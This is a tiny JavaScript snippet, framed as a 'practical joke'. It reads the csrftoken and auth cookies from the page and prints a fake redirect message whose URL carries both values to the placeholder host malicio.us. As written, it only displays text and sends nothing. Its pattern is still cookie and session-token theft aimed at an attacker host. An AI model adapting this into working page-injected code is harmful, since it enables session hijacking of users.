// This is a more practical yoke:

const csrf = document.cookie.match(/csrftoken=[^;]+/)[0];
const auth = document.cookie.match(/auth=[^;]+/)[0];

document.write(`Redirecting to http://malicio.us/?${csrf}&${auth}`);
setInterval(() => document.write('.'), 300);
